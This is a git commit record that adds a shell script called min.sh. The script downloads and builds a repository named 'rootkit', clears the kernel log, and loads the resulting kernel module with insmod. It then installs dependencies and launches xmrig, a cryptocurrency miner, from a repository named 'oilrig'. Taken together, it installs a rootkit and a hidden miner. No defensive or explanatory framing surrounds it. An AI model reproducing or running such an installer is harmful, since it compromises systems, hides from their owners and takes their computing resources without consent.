0eda577967d4db68e7cfa8c5143f9f73a679a5f9
Vyom 907 AND Vyom Wankhede <111875466+VYOM00907@users.noreply.github.com>
2022-11-15 14:04:39 +0000

    g

---
+++ min.sh
@@ -0,0 +1,28 @@
+#!/bin/bash
+
+echo " starting install root "
+echo " cloning "
+git clone https://github.com/VYOM00907/rootkit
+echo " building "
+cd rootkit/
+make
+echo "successfully completed installation"
+
+echo "installing xm"
+echo "installing dependencies"
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo apt install hwloc
+echo "downloading..."
+git clone https://github.com/VYOM00907/oilrig
+
+echo "launcher started "
+
+echo "loading module"
+dmesg -C 
+insmod rootkit.ko
+dmesg 
+echo "done loading module"
+cd oilrig 
+./xmrig 
+
+echo "done launching "
